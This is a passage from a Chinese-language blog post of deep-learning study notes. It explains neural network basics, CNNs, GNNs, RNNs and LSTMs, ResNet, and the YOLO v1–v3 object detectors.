alt="Snipaste_2022-12-04_06-39-19"></p><p>阶跃函数：当输入小于等于0时，输出0；当输入大于0时，输出1。</p><p>Sigmoid：当输入趋近于正无穷&#x2F;负无穷时，输出无限接近于1&#x2F;0。</p><p>ReLU：当输入小于0时，输出0；当输入大于0时，输出等于输入。</p><p>其中，阶跃函数输出值是跳变的，且只有二值，较少使用；Sigmoid函数在当x的绝对值较大时，曲线的斜率变化很小（梯度消失），并且计算较复杂；ReLU是当前较为常用的激活函数。</p><p>需要注意的是，每个隐藏层计算（矩阵线性运算）之后，都需要加一层激活层，要不然该层线性计算是没有意义的。</p><p>softmax:对输出结果正规化处理,简单来说分三步进行：（1）以e为底对所有元素求指数幂；（2）将所有指数幂求和；（3）分别将这些指数幂与该和做商。</p><p>交叉熵损失（Cross Entropy Error）：一种直观的解决方法，是用1减去Softmax输出的概率，不过更为常用且巧妙的方法是，求<strong>对数的负数</strong>。</p><p>还是用90%举例，对数的负数就是：-log0.9&#x3D;0.046</p><p><strong>我们训练神经网络的目的，就是尽可能地减少这个“交叉熵损失”。</strong></p><p>一句话复习一下：<strong>神经网络的传播都是形如Y&#x3D;WX+b的矩阵运算；为了给矩阵运算加入非线性，需要在隐藏层中加入激活层；输出层结果需要经过Softmax层处理为概率值，并通过交叉熵损失来量化当前网络的优劣。</strong></p><h5 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h5><p>反向传播就是一个<strong>参数优化</strong>的过程，优化对象就是网络中的所有W和b（因为其他所有参数都是确定的）。</p><p>神经网络的神奇之处，就在于它可以自动做W和b的优化，在深度学习中，参数的数量有时会上亿，不过其优化的原理和我们这个两层神经网络是一样的。</p><p>常用方法：</p><p>梯度下降法</p><p>迭代法</p><p> 反向传播算法（Backpropagation）是目前用来训练人工神经网络（Artificial Neural Network，ANN）的最常用且最有效的算法。其主要思想是：<br>（1）将训练集数据输入到ANN的输入层，经过隐藏层，最后达到输出层并输出结果，这是ANN的前向传播过程；<br>（2）由于ANN的输出结果与实际结果有误差，则计算估计值与实际值之间的误差，并将该误差从输出层向隐藏层反向传播，直至传播到输入层；<br>（3）在反向传播的过程中，根据误差调整各种参数的值；不断迭代上述过程，直至收敛。</p><h4 id="cnn：卷积神经网络"><a href="#cnn：卷积神经网络" class="headerlink" title="cnn：卷积神经网络"></a>cnn：卷积神经网络</h4><p>如果用全连接神经网络处理大尺寸图像具有三个明显的缺点：</p><p>（1）首先将图像展开为向量会丢失空间信息；</p><p>（2）其次参数过多效率低下，训练困难；</p><p>（3）同时大量的参数也很快会导致网络过拟合。</p><p>而使用卷积神经网络可以很好地解决上面的三个问题。</p><p>卷积神经网络的各层中的神经元是3维排列的：宽度、高度和深度。其中的宽度和高度是很好理解的，因为本身卷积就是一个二维模板，但是在卷积神经网络中的深度指的是<strong>激活数据体</strong>的第三个维度，而不是整个网络的深度，整个网络的深度指的是网络的层数。举个例子来理解什么是宽度，高度和深度，假如使用CIFAR-10中的图像是作为卷积神经网络的输入，该<strong>输入数据体</strong>的维度是32x32x3（宽度，高度和深度）。<strong>我们将看到，层中的神经元将只与前一层中的一小块区域连接，而不是采取全连接方式。</strong>对于用来分类CIFAR-10中的图像的卷积网络，其最后的输出层的维度是1x1x10，因为在卷积神经网络结构的最后部分将会把全尺寸的图像压缩为包含分类评分的一个向量，<strong>向量是在深度方向排列的</strong>。下面是全连接神经网络与卷积神经网络的对比：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_07-04-52-20221204%2021:57:09.png" alt="Snipaste_2022-12-04_07-04-52"></p><p>典型的 CNN 由3个部分构成：</p><ol><li>卷积层</li><li>池化层</li><li>全连接层</li></ol><p>卷积层负责提取图像中的局部特征；池化层用来大幅降低参数量级(降维)；全连接层类似传统神经网络的部分，用来输出想要的结果。</p><p>卷积层的运算过程如下图，用一个卷积核扫完整张图片：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/f144f-2019-06-19-juanji-20221204%2021:58:52.gif" alt="f144f-2019-06-19-juanji"></p><p>在具体应用中，往往有多个卷积核，可以认为，每个卷积核代表了一种图像模式，如果某个图像块与此卷积核卷积出的值大，则认为此图像块十分接近于此卷积核。如果我们设计了6个卷积核，可以理解：我们认为这个图像上有6种底层纹理模式，也就是我们用6中基础模式就能描绘出一副图像。</p><p>池化层简单说就是下采样，他可以大大降低数据的维度。其过程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/3fd53-2019-06-19-chihua-20221204%2021:59:11.gif" alt="3fd53-2019-06-19-chihua"></p><p>上图中，我们可以看到，原始图片是20×20的，我们对其进行下采样，采样窗口为10×10，最终将其下采样成为一个2×2大小的特征图。</p><p>之所以这么做的原因，是因为即使做完了卷积，图像仍然很大（因为卷积核比较小），所以为了降低数据维度，就进行下采样。</p><p>总结：池化层相比卷积层可以更有效的降低数据维度，这么做不但可以大大减少运算量，还可以有效的避免过拟合。</p><p>经过卷积层和池化层处理过的数据输入到全连接层，得到最终想要的结果。</p><p>经过卷积层和池化层降维过的数据，全连接层才能”跑得动”，不然数据量太大，计算成本高，效率低下。</p><p>典型的 CNN 并非只是上面提到的3层结构，而是多层结构，例如 LeNet-5 的结构就是卷积层 – 池化层- 卷积层 – 池化层 – 卷积层 – 全连接层</p><h4 id="gnn：图神经网络"><a href="#gnn：图神经网络" class="headerlink" title="gnn：图神经网络"></a>gnn：图神经网络</h4><p>图(graph)是一种数据结构，图神经网络(Graph Neural Network)应该是深度学习在图结构数据上的一些模型、方法和应用。常见的图结构由节点(node)和边(edge)构成，节点包含了实体(entity)信息，边包含实体间的关系(relation)信息。现在许多学习任务都需要**处理图结构的数据，比如物理系统建模(physics system)、学习分子指纹(molecular fingerprints)、蛋白质接口预测(protein interface)以及疾病分类(classify diseases)**，这些都需要模型能够从图结构的输入中学习相关的知识。</p><p>首先，标准的神经网络比如CNN和RNN不能够适当地处理图结构输入，因为它们都需要节点的特征按照一定的顺序进行排列，但是，<strong>对于图结构而言，并没有天然的顺序而言</strong>，如果使用顺序来完整地表达图的话，那么就需要将图分解成所有可能的序列，然后对序列进行建模，显然，这种方式非常的冗余以及计算量非常大，与此相反，<strong>GNN采用在每个节点上分别传播(propagate)的方式进行学习</strong>，由此忽略了节点的顺序，相当于GNN的输出会随着输入的不同而不同。</p><p>另外，<strong>图结构的边表示节点之间的依存关系</strong>，然而，传统的神经网络中，依存关系是通过节点特征表达出来的，也就是说，传统的神经网络不是显式地表达中这种依存关系，而是通过不同节点特征来间接地表达节点之间的关系。通常来说，<strong>GNN通过邻居节点的加权求和来更新节点的隐藏状态</strong>。</p><p>最后，就是<strong>对于高级的人工智能来说，推理是一个非常重要的研究主题</strong>，人类大脑的推理过程基本上都是基于图的方式，这个图是从日常的生活经历中学习得到的。GNN尝试从非结构化数据比如情景图片和故事文本中产生结构化的图，并通过这些图来生成更高级的AI系统。</p><p><strong>论文对GNN的模型分类如下：</strong></p><ul><li>图卷积网络(Graph convolutional networks)和图注意力网络(graph attention networks)，因为涉及到传播步骤(propagation step)。</li><li>图的空域网络(spatial-temporal networks)，因为该模型通常用在动态图(dynamic graph)上。</li><li>图的自编码(auto-encoder)，因为该模型通常使用无监督学习(unsupervised)的方式。</li><li>图生成网络(generative networks)，因为是生成式网络。</li></ul><blockquote><p>更多资料可参考 [这里][<a href="https://zhuanlan.zhihu.com/p/76025331]">https://zhuanlan.zhihu.com/p/76025331]</a></p></blockquote><h4 id="rnn：递归神经网络"><a href="#rnn：递归神经网络" class="headerlink" title="rnn：递归神经网络"></a>rnn：递归神经网络</h4><p>适合序列数据 – 一串相互依赖的数据流的场景</p><p>典型的集中序列数据：</p><ol><li>文章里的文字内容</li><li>语音里的音频内容</li><li>股票市场中的价格走势</li><li>……</li></ol><p>RNN 跟传统神经网络最大的区别在于每次都会将前一次的输出结果，带到下一次的隐藏层中，一起训练。如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/f0116-2019-07-02-rnn-1-20221204%2021:59:34.gif" alt="f0116-2019-07-02-rnn-1"></p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_07-54-59-20221204%2021:59:44.png" alt="Snipaste_2022-12-04_07-54-59"></p><p>&#x3D;&#x3D;应用场景：文本生成　机器翻译　语音识别　生成图像描述　视频标记&#x3D;&#x3D;</p><h4 id="lstm：长短期记忆递归神经网络"><a href="#lstm：长短期记忆递归神经网络" class="headerlink" title="lstm：长短期记忆递归神经网络"></a>lstm：长短期记忆递归神经网络</h4><p>RNN 是一种死板的逻辑，越晚的输入影响越大，越早的输入影响越小，且无法改变这个逻辑。</p><p>LSTM从被设计之初就被用于解决一般递归神经网络中普遍存在的<strong>长期依赖问题</strong>，使用LSTM可以有效的传递和表达长时间序列中的信息并且不会导致长时间前的有用信息被忽略（遗忘）。与此同时，LSTM还可以解决RNN中的梯度消失&#x2F;爆炸问题。</p><p>Gated Recurrent Unit – GRU 是 LSTM 的一个变体。他保留了 LSTM 划重点，遗忘不重要信息的特点，在long-term 传播的时候也不会被丢失。</p><p>GRU 主要是在 LSTM 的模型上做了一些简化和调整，在训练数据集比较大的情况下可以节省很多时间。</p><p>详细实现可参考 <a href="https://zhuanlan.zhihu.com/p/123857569">这里</a></p><h4 id="分类-回归-聚类-降维-有监督-无监督"><a href="#分类-回归-聚类-降维-有监督-无监督" class="headerlink" title="分类\回归\聚类\降维\有监督\无监督"></a>分类\回归\聚类\降维\有监督\无监督</h4><p>1，给定一个样本特征 , 我们希望预测其对应的属性值 , 如果是离散的, 那么这就是一个分类问题，反之，如果 是连续的实数, 这就是一个回归问题。<br>2，如果给定一组样本特征 , 我们没有对应的属性值 , 而是想发掘这组样本在二维空间的分布, 比如分析哪些样本靠的更近，哪些样本之间离得很远, 这就是属于聚类问题。<br>3，如果我们想用维数更低的子空间来表示原来高维的特征空间, 那么这就是降维问题。</p><h4 id="元学习"><a href="#元学习" class="headerlink" title="元学习"></a>元学习</h4><p>通常在机器学习里，我们会使用某个场景的大量数据来训练模型；然而当场景发生改变，模型就需要重新训练。但是对于人类而言，一个小朋友成长过程中会见过许多物体的照片，某一天，当Ta（第一次）仅仅看了几张狗的照片，就可以很好地对狗和其他物体进行区分。</p><p>元学习Meta Learning，含义为学会学习，即learn to learn，就是带着这种对人类这种“学习能力”的期望诞生的。Meta Learning希望使得模型获取一种“学会学习”的能力，使其可以在获取已有“知识”的基础上快速学习新的任务。</p><p>需要注意的是，虽然同样有“预训练”的意思在里面，但是元学习的内核区别于迁移学习（Transfer Learning）。</p><p>详细研究可参考 [李宏毅视频][<a href="https://www.youtube.com/@HungyiLeeNTU/search?query=meta%5D">https://www.youtube.com/@HungyiLeeNTU/search?query=meta]</a></p><h4 id="restnet"><a href="#restnet" class="headerlink" title="restnet"></a>restnet</h4><p>卷积神经网络在图像分类领域具有非常广泛的应用，从理论上讲，越深的网络结构，其拟合能力应该越强，如16层的VGG16的拟合能力要强于5层的LeNet。然而，何恺明等人通过实验发现，当网络的深度达到一定程度时，网络的性能不升反降，并且这种性能的下降不是由过拟合引起的，因为深度网络的训练误差和测试误差都比浅层网络高，如图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_08-24-48-20221204%2021:59:56.png" alt="Snipaste_2022-12-04_08-24-48"></p><p>为改善上述问题，何恺明等人提出了深度残差学习框架。</p><p>常规的神经网络，是将卷积层、全连接层等结构按照一定的顺序简单地连接到一起，每层结构仅接受来自上一层的信息，并在本层处理后传递给下一层。当网络层次加深后，这种单一的连接方式会导致神经网络性能退化。所谓的残差学习，就是在上述的单一连接方式的基础上，加入了“<strong>短连接</strong>”（shortcut connections），如图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_08-25-42-20221204%2022:00:04.png" alt="Snipaste_2022-12-04_08-25-42"></p><p>短连接能跨越几个层，将输入x直接映射到输出端（类似于电路中的短路），与输出相加。这样做导致的直接结果就是，在神经网络中加入上述的结构不再会导致神经网络的退化，考虑最坏的情况也不过是F(x)为0，这相当于网络没有加深，与之前一致。但是如果加入的层有效，就能使网络的性能得到提升。从数学的角度来看，上述结构的输入为x，输出H(x)为：</p><p>H(x)&#x3D;F(x)+xH(x)&#x3D;F(x)+x</p><p>其中F(x)称为残差函数，变换上式可得：</p><p>F(x)&#x3D;H(x)−xF(x)&#x3D;H(x)−x</p><p>显然，该结构中加入的短连接是没有参数的，因此学习H(x)的参数与学习F(x)的参数本质上是一样的，但是将函数优化为0或者在0附近显然更容易。因此，残差学习，学习的就是残差函数F(x)的参数。</p><p>论文原文中给出了两种ResNet的基本单元结构，其中左边的单元用于较浅的网络，如ResNet18、ResNet34，右边的单元则用于较深的网络，如ResNet50、ResNet101等。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_08-32-49-20221204%2022:00:13.png" alt="Snipaste_2022-12-04_08-32-49"></p><p>首先，无论是左边还是右边的单元，都是由卷积层和激活函数构成的。左边的单元由2个大小为3x3的卷积层与2个ReLU激活函数构成，右边的单元由2个1x1、1个3x3的卷积层和3个ReLU激活函数构成。至于卷积核的的通道（channel）数，则由单元的具体位置决定。通常卷积神经网络在提取图像特征的过程种，卷积核都会从“大卷积核、低通道数量“层层递进到到”小卷积核、多通道数量“。因此，在实际应用的过程种，短连接跨越的卷积层的通道数量有所改变是非常常见的。原论文中给出了直接连接、填零连接和映射连接三种具体的短连接形式。当实际单元的输入通道数与输出相同时，如上图左，则短连接<strong>直接连接</strong>即可。若输入通道数与输出不相同，如上图右，输入的维度为64，输出却是256，此时输入x无法与F(x)直接相加。<strong>填零连接</strong>就是将多出的维度全部填充0后再进行相加，这个方法不会引入额外的参数。<strong>映射连接</strong>则是通过矩阵变换，利用大小为1x1的卷积层扩展输入的维度后再进行相加。短连接跨越通道数不同的卷积层时，卷积执行的步长为2，这刚好缩小特征矩阵的大小，并增加了特征的通道数。</p><p>原论文中给出了如下5个具体的ResNet网络，这些网络都由上述的基本单元构成。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_08-35-51-20221204%2022:00:22.png" alt="Snipaste_2022-12-04_08-35-51"></p><h3 id="3-opencv：跨平台计算机视觉库"><a href="#3-opencv：跨平台计算机视觉库" class="headerlink" title="3.opencv：跨平台计算机视觉库"></a>3.opencv：跨平台计算机视觉库</h3><p><a href="https://opencv.org/">官网</a></p><h4 id="图像基本操作"><a href="#图像基本操作" class="headerlink" title="图像基本操作"></a>图像基本操作</h4><h4 id="阈值与平滑处理"><a href="#阈值与平滑处理" class="headerlink" title="阈值与平滑处理"></a>阈值与平滑处理</h4><h4 id="图像形态学操作"><a href="#图像形态学操作" class="headerlink" title="图像形态学操作"></a>图像形态学操作</h4><h4 id="图像梯度计算"><a href="#图像梯度计算" class="headerlink" title="图像梯度计算"></a>图像梯度计算</h4><h4 id="边缘检测"><a href="#边缘检测" class="headerlink" title="边缘检测"></a>边缘检测</h4><h4 id="图像金字塔与轮廓检测"><a href="#图像金字塔与轮廓检测" class="headerlink" title="图像金字塔与轮廓检测"></a>图像金字塔与轮廓检测</h4><h4 id="直方图与傅里叶变换"><a href="#直方图与傅里叶变换" class="headerlink" title="直方图与傅里叶变换"></a>直方图与傅里叶变换</h4><h4 id="图像特征"><a href="#图像特征" class="headerlink" title="图像特征"></a>图像特征</h4><h4 id="相关实践：数字识别、OCR识别、全景图像拼接、车位识别、答题卡判卷、背景建模、光流估计、目标追踪"><a href="#相关实践：数字识别、OCR识别、全景图像拼接、车位识别、答题卡判卷、背景建模、光流估计、目标追踪" class="headerlink" title="相关实践：数字识别、OCR识别、全景图像拼接、车位识别、答题卡判卷、背景建模、光流估计、目标追踪"></a>相关实践：数字识别、OCR识别、全景图像拼接、车位识别、答题卡判卷、背景建模、光流估计、目标追踪</h4><h3 id="4-物体检测：yolo"><a href="#4-物体检测：yolo" class="headerlink" title="4. 物体检测：yolo"></a>4. 物体检测：yolo</h3><p>YOLO系列是one-stage且是基于<a href="https://so.csdn.net/so/search?q=%E6%B7%B1%E5%BA%A6&spm=1001.2101.3001.7020">深度</a>学习的回归方法，而R-CNN、Fast-RCNN、Faster-RCNN等是two-stage且是基于深度学习的分类方法。</p><p><a href="https://github.com/pjreddie/darknet">YOLO官网</a></p><h4 id="YOLO-v1"><a href="#YOLO-v1" class="headerlink" title="YOLO v1"></a>YOLO v1</h4><p>论文地址：<a href="https://arxiv.org/abs/1506.02640">https://arxiv.org/abs/1506.02640</a></p><p>官方代码：<a href="https://github.com/pjreddie/darknet">https://github.com/pjreddie/darknet</a></p><p>YOLOv1的核心思想：</p><p>YOLOv1的核心思想就是利用整张图作为网络的输入，直接在输出层回归bounding box的位置和bounding box所属的类别。</p><p>实现方法：</p><ul><li>将一幅图像分成SxS个网格(grid cell)，如果某个object的中心落在这个网格中，则这个网格就负责预测这个object。</li><li>每个网格要预测B个bounding box，每个bounding box除了要回归自身的位置之外，还要附带预测一个confidence值。这个confidence代表了所预测的box中含有object的置信度和这个box预测的有多准两重信息，其值是这样计算的：$P_r(Object) * IOU_{pred}^{truth}$，该表达式含义：如果有object落在一个grid cell里，则第一项取1，否则取0。 第二项是预测的bounding box和实际的groundtruth之间的IoU值。 </li><li>每个bounding box要预测(x, y, w, h)和confidence共5个值，每个网格还要预测一个类别信息，记为C类。则SxS个网格，每个网格要预测B个bounding box还要预测C个categories。输出就是S x S x (5*B+C)的一个tensor。</li></ul><p>注意：class信息是针对每个网格的，confidence信息是针对每个bounding box的。</p><p><strong>举例</strong></p><p>在PASCAL VOC中，图像输入为448x448像素，取S&#x3D;7，B&#x3D;2，一共有20个类别(C&#x3D;20)。则输出就是7x7x(2x5+20)的一个tensor。整个网络结构如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_18-44-35-20221204%2022:00:36.png" alt="Snipaste_2022-12-04_18-44-35"></p><ul><li>在test的时候，每个网格预测的class信息和bounding box预测的confidence信息相乘，就得到每个bounding box的class-specific confidence score，得到每个box的class-specific confidence score以后，设置阈值，滤掉得分低的boxes，对保留的boxes进行NMS处理，就得到最终的检测结果。</li></ul><p>注意：<br>由于输出层为全连接层，因此在检测时，YOLOv1模型的输入只支持与训练图像相同的输入分辨率。<br>虽然每个格子可以预测B个bounding box，但是最终只选择IOU最高的bounding box作为物体检测输出，即每个格子最多只预测出一个物体。当物体占画面比例较小，如图像中包含畜群或鸟群时，每个格子包含多个物体，但却只能检测出其中一个。</p><p><strong>简单的概括就是：</strong></p><ul><li>给个一个输入图像，首先将图像划分成7*7的网格；</li><li>对于每个网格，我们都预测2个边框（包括每个边框是目标的置信度以及每个边框区域在多个类别上的概率）；</li><li>根据上一步可以预测出7<em>7</em>2个目标窗口，然后根据阈值去除可能性比较低的目标窗口，最后NMS去除冗余窗口即可。</li></ul><p>YOLO的缺点</p><ul><li>YOLO对相互靠的很近的物体和很小的群体检测效果不好，这是因为一个网格中只预测了两个框，并且只属于一类；</li><li>同一类物体出现的新的不常见的长宽比和其他情况时，泛化能力偏弱；</li><li>由于损失函数的问题，定位误差是影响检测效果的主要原因。尤其是大小物体的处理上，还有待加强。</li></ul><h4 id="YOLO-v2"><a href="#YOLO-v2" class="headerlink" title="YOLO v2"></a>YOLO v2</h4><p>论文地址：<a href="https://arxiv.org/abs/1612.08242">https://arxiv.org/abs/1612.08242</a></p><p>官方代码：<a href="http://pjreddie.com/darknet/yolo/">http://pjreddie.com/darknet/yolo/</a></p><p>YOLOv2相对v1版本，在继续保持处理速度的基础上，从预测<strong>更准确（Better）</strong>，<strong>速度更快（Faster）</strong>，<strong>识别对象更多（Stronger）</strong>这三个方面进行了改进。其中识别更多对象也就是扩展到能够检测9000种不同对象，称之为<strong>YOLO9000</strong>。</p><p>文章提出了一种新的训练方法–联合训练算法，这种算法可以把这两种的数据集混合到一起。使用一种分层的观点对物体进行分类，用巨量的分类数据集数据来扩充检测数据集，从而把两种不同的数据集混合起来。联合训练算法的基本思路就是：同时在检测数据集和分类数据集上训练物体检测器（Object Detectors ），用检测数据集的数据学习物体的准确位置，用分类数据集的数据来增加分类的类别量、提升健壮性。</p><p>YOLO9000就是使用联合训练算法训练出来的，他拥有9000类的分类信息，这些分类信息学习自ImageNet分类数据集，而物体位置检测则学习自COCO检测数据集。</p><p>YOLOv1有很多缺点，作者希望改进的方向是:<strong>改善recall，提升定位的准确度</strong>，同时保持分类的准确度。</p><h5 id="改进点"><a href="#改进点" class="headerlink" title="改进点"></a>改进点</h5><p><strong>Batch Normalization</strong><br>批量归一化有助于解决反向传播过程中的梯度消失和梯度爆炸问题，降低对一些超参数（比如学习率、网络参数的大小范围、激活函数的选择）的敏感性，并且每个batch分别进行归一化的时候，起到了一定的正则化效果（YOLOv2不再使用dropout），从而能够获得更好的收敛速度和收敛效果。</p><p>使用Batch Normalization对网络进行优化，让网络提高了收敛性，同时还消除了对其他形式的正则化（regularization）的依赖。通过对YOLOv2的每一个卷积层增加Batch Normalization，最终使得mAP提高了2%，同时还使model正则化。使用Batch Normalization可以从model中去掉Dropout，而不会产生过拟合。</p><p><strong>High resolution classifier</strong><br>用于图像分类的训练样本很多，而标注了边框的用于训练目标检测的样本相比而言就少了很多，因为标注边框的人工成本比较高。所以目标检测模型通常都先用图像分类样本训练卷积层，提取图像特征，但这引出另一个问题，就是图像分类样本的分辨率不是很高。所以YOLOv1使用ImageNet的图像分类样本采用 224<em>224 作为输入，来训练CNN卷积层。然后在训练目标检测时，检测用的图像样本采用更高分辨率的 448</em>448 像素图像作为输入，但这样不一致的输入分辨率肯定会对模型性能有一定影响。</p><p>所以YOLOv2在采用 224<em>224 图像进行分类模型预训练后，再采用 448</em>448 高分辨率样本对分类模型进行微调（10个epoch），使网络特征逐渐适应 448<em>448 的分辨率。然后再使用 448</em>448 的检测样本进行训练，缓解了分辨率突然切换造成的影响，最终通过使用高分辨率，mAP提升了4%。</p><p><strong>Convolution with anchor boxes</strong></p><p>YOLOv1包含有全连接层，从而能直接预测Bounding Boxes的坐标值。Faster R-CNN算法只用卷积层与Region Proposal Network来预测Anchor Box的偏移值与置信度，而不是直接预测坐标值，YOLOv2作者发现通过预测偏移量而不是坐标值能够简化问题，让神经网络学习起来更容易。</p><p>借鉴Faster RCNN的做法，YOLOv2也尝试采用先验框（anchor）。在每个grid预先设定一组不同大小和宽高比的边框，来覆盖整个图像的不同位置和多种尺度，这些先验框作为预定义的候选区在神经网络中将检测其中是否存在对象，以及微调边框的位置。</p><p>之前YOLOv1并没有采用先验框，并且每个grid只预测两个bounding box，也就是整个图像只有98个bounding box。YOLOv2如果每个grid采用9个先验框，总共有13<em>13</em>9&#x3D;1521个先验框。所以最终YOLOv2去掉了全连接层，使用Anchor Boxes来预测 Bounding Boxes。作者去掉了网络中一个Pooling层，这让卷积层的输出能有更高的分辨率，同时对网络结构进行收缩让其运行在416<em>416而不是448</em>448。</p><p>由于图片中的物体都倾向于出现在图片的中心位置，特别是那种比较大的物体，所以有一个单独位于物体中心的位置用于预测这些物体。YOLOv2的卷积层采用32这个值来下采样图片，所以通过选择416*416用作输入尺寸最终能输出一个13*13的Feature Map。使用Anchor Box会让精确度稍微下降，但用了它能让YOLOv2能预测出大于一千个框，同时recall达到88%，mAP达到69.2%。<br><strong>Dimension clusters</strong><br>之前Anchor Box的尺寸是手动选择的，所以尺寸还有优化的余地。YOLOv2尝试统计出更符合样本中对象尺寸的先验框，这样就可以减少网络微调先验框到实际位置的难度。YOLOv2的做法是对训练集中标注的边框进行K-means聚类分析，以寻找尽可能匹配样本的边框尺寸。如果我们用标准的欧式距离的k-means，尺寸大的框比小框产生更多的错误。因为我们的目的是提高IOU分数，这依赖于Box的大小，所以距离度量的使用：</p><p>其中，centroid是聚类时被选作中心的边框，box就是其它边框，d就是两者间的“距离”，IOU越大，“距离”越近。YOLOv2给出的聚类分析结果如下图所示，通过分析实验结果（Figure 2），在model复杂性与high recall之间权衡之后，选择聚类分类数K&#x3D;5。<br>Direct location prediction<br>用Anchor Box的方法，会让model变得不稳定，尤其是在最开始几次迭代的时候。大多数不稳定因素产生自预测Box的(x,y)位置的时候。按照之前YOLOv1的方法，网络不会预测偏移量，而是根据YOLOv1中的网格单元的位置来直接预测坐标，这就让Ground Truth的值介于0到1之间。而为了让网络的结果能落在这一范围内，网络使用一个 Logistic Activation来对于网络预测结果进行限制，让结果介于0到1之间。 网络在每一个网格单元中预测出5个Bounding Boxes，每个Bounding Boxes有五个坐标值tx，ty，tw，th，t0，他们的关系见下图。假设一个网格单元对于图片左上角的偏移量是cx，cy，Bounding Boxes Prior的宽度和高度是pw，ph，那么预测的结果见下图右面的公式：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_18-56-44-20221204%2022:00:49.png" alt="Snipaste_2022-12-04_18-56-44"></p><p><strong>Fine-Grained Features</strong><br>目标检测面临的一个问题是图像中的需要检测的目标会有大有小，输入图像经过多层网络提取特征，最后输出的特征图中（比如YOLOv2中输入416<em>416经过卷积网络下采样最后输出是13</em>13），较小的对象可能特征已经不明显甚至被忽略掉了。为了更好的检测出一些比较小的对象，最后输出的特征图需要保留一些更细节的信息。于是YOLOv2引入一种称为passthrough层的方法在特征图中保留一些细节信息。具体来说，就是在最后一个pooling之前，特征图的大小是26<em>26</em>512，将其1拆4，直接传递（passthrough）到pooling后（并且又经过一组卷积）的特征图，两者叠加到一起作为输出的特征图。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_18-58-27-20221204%2022:01:01.png" alt="Snipaste_2022-12-04_18-58-27"></p><p>具体怎样将1个特征图拆成4个特征图，见下图，图中示例的是1个4<em>4拆成4个2</em>2，因为深度不变，所以没有画出来。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_18-58-53-20221204%2022:01:10.png" alt="Snipaste_2022-12-04_18-58-53"></p><p><strong>Multi-ScaleTraining</strong></p><p>作者希望YOLOv2能健壮的运行于不同尺寸的图片之上，所以把这一想法用于训练model中。区别于之前的补全图片的尺寸的方法，YOLOv2每迭代几次都会改变网络参数。每10个Batch，网络会随机地选择一个新的图片尺寸，由于使用了下采样参数是32，所以不同的尺寸大小也选择为32的倍数{320，352…..608}，最小320<em>320，最大608</em>608，网络会自动改变尺寸，并继续训练的过程。这一政策让网络在不同的输入尺寸上都能达到一个很好的预测效果，同一网络能在不同分辨率上进行检测。当输入图片尺寸比较小的时候跑的比较快，输入图片尺寸比较大的时候精度高，所以你可以在YOLOv2的速度和精度上进行权衡。</p><p><strong>YOLOv2 Faster</strong></p><p>YOLOv1的backbone使用的是GoogleLeNet，速度比VGG-16快，YOLOv1完成一次前向过程只用8.52 billion 运算，而VGG-16要30.69billion，但是YOLOv1精度稍低于VGG-16。</p><p>YOLOv2基于一个新的分类model，有点类似与VGG。YOLOv2使用3*3filter，每次Pooling之后都增加一倍Channels的数量。YOLOv2使用Global Average Pooling，使用Batch Normilazation来让训练更稳定，加速收敛，使model规范化。最终的model–Darknet19，有19个卷积层和5个maxpooling层，处理一张图片只需要5.58 billion次运算，在ImageNet上达到72.9%top-1精确度，91.2%top-5精确度。</p><p>网络训练在 ImageNet 1000类分类数据集上训练了160epochs，使用随机梯度下降，初始学习率为0.1， polynomial rate decay with a power of 4, weight decay of 0.0005 and momentum of 0.9 。训练期间使用标准的数据扩大方法：随机裁剪、旋转、变换颜色（hue）、变换饱和度（saturation）， 变换曝光度（exposure shifts）。在训练时，把整个网络在更大的448*448分辨率上Fine Turnning 10个 epoches，初始学习率设置为0.001，这种网络达到达到76.5%top-1精确度，93.3%top-5精确度。</p><p>网络去掉了最后一个卷积层，而加上了三个3<em>3卷积层，每个卷积层有1024个Filters，每个卷积层紧接着一个1</em>1卷积层。对于VOC数据，网络预测出每个网格单元预测五个Bounding Boxes，每个Bounding Boxes预测5个坐标和20类，所以一共125个Filters，增加了Passthough层来获取前面层的细粒度信息，网络训练了160epoches，初始学习率0.001，数据扩大方法相同，对COCO与VOC数据集的训练对策相同。</p><h4 id="YOLO-v3"><a href="#YOLO-v3" class="headerlink" title="YOLO v3"></a>YOLO v3</h4><p>论文地址：<a href="https://pjreddie.com/media/files/papers/YOLOv3.pdf">https://pjreddie.com/media/files/papers/YOLOv3.pdf</a> </p><p>这张图很好的总结了YOLOv3的结构，让我们对YOLO有更加直观的理解。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_19-04-40-20221204%2022:01:21.png" alt="Snipaste_2022-12-04_19-04-40"></p><p>DBL: 代码中的Darknetconv2d_BN_Leaky，是YOLOv3的基本组件，就是卷积+BN+Leaky relu。<br>resn：n代表数字，有res1，res2, … 